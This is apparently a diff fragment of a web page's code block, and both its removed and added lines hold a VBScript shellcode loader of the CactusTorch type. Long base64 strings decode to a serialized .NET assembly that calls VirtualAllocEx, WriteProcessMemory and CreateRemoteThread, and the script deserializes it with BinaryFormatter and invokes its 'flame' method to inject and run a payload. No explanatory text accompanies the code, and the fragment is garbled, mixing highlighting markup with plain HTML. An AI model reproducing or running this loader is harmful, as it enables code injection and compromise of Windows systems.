-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA&quot;</span>
-entry_class <span class="token operator">=</span> <span class="token string">&quot;cactusTorch&quot;</span> 
-
-<span class="token keyword">Dim</span> fmt<span class="token punctuation">,</span> al<span class="token punctuation">,</span> d<span class="token punctuation">,</span> o
-<span class="token keyword">Set</span> fmt <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&quot;</span><span class="token punctuation">)</span>
-<span class="token keyword">Set</span> al <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;System.Collections.ArrayList&quot;</span><span class="token punctuation">)</span>
-al<span class="token punctuation">.</span>Add fmt<span class="token punctuation">.</span>SurrogateSelector 
-
-<span class="token keyword">Set</span> d <span class="token operator">=</span> fmt<span class="token punctuation">.</span>Deserialize_2<span class="token punctuation">(</span>Base64ToStream<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">Set</span> o <span class="token operator">=</span> d<span class="token punctuation">.</span>DynamicInvoke<span class="token punctuation">(</span>al<span class="token punctuation">.</span>ToArray<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>CreateInstance<span class="token punctuation">(</span>entry_class<span class="token punctuation">)</span>
-o<span class="token punctuation">.</span>flame binary<span class="token punctuation">,</span>code
-<span class="token keyword">End</span> <span class="token keyword">Sub</span> 
-
-SetVersion
-<span class="token keyword">On</span> <span class="token keyword">Error</span> <span class="token keyword">Resume</span> <span class="token keyword">Next</span>
+JA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=&quot;</p>
+<p>Sub Debug(s)
+End Sub
+Sub SetVersion
+End Sub
+Function Base64ToStream(b)
+Dim enc, length, ba, transform, ms
+Set enc = CreateObject(&quot;System.Text.ASCIIEncoding&quot;)
+length = enc.GetByteCount_2(b)
+Set transform = CreateObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;)
+Set ms = CreateObject(&quot;System.IO.MemoryStream&quot;)
+ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
+ms.Position = 0
+Set Base64ToStream = ms
+End Function
+Sub Run</p>
+<p>Dim s, entry_class</p>
+<p>s = &quot;AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;
+s = s &amp; &quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;
+s = s &amp; &quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;
+s = s &amp; &quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;
+s = s &amp; &quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;
+s = s &amp; &quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;
+s = s &amp; &quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;
+s = s &amp; &quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;
+s = s &amp; &quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;
+s = s &amp; &quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;
+s = s &amp; &quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;
+s = s &amp; &quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;
+s = s &amp; &quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;
+s = s &amp; &quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;
+s = s &amp; &quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;
+s = s &amp; &quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;
+s = s &amp; &quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;
+s = s &amp; &quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;
+s = s &amp; &quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;
+s = s &amp; &quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;
+s = s &amp; &quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;
+s = s &amp; &quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;
+s = s &amp; &quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA&quot;
+s = s &amp; &quot;AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;
+s = s &amp; &quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA&quot;
+s = s &amp; &quot;AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA&quot;
+s = s &amp; &quot;AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT&quot;
+s = s &amp; &quot;MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA&quot;
+s = s &amp; &quot;Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME&quot;
+s = s &amp; &quot;EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK&quot;
+s = s &amp; &quot;ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK&quot;
+s = s &amp; &quot;EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA&quot;
+s = s &amp; &quot;BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC&quot;
+s = s &amp; &quot;fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP&quot;
+s = s &amp; &quot;AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj&quot;
+s = s &amp; &quot;fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB&quot;
+s = s &amp; &quot;AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA&quot;
+s = s &amp; &quot;ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF&quot;
+s = s &amp; &quot;kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG&quot;
+s = s &amp; &quot;AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I&quot;
+s = s &amp; &quot;qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK&quot;
+s = s &amp; &quot;ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB&quot;
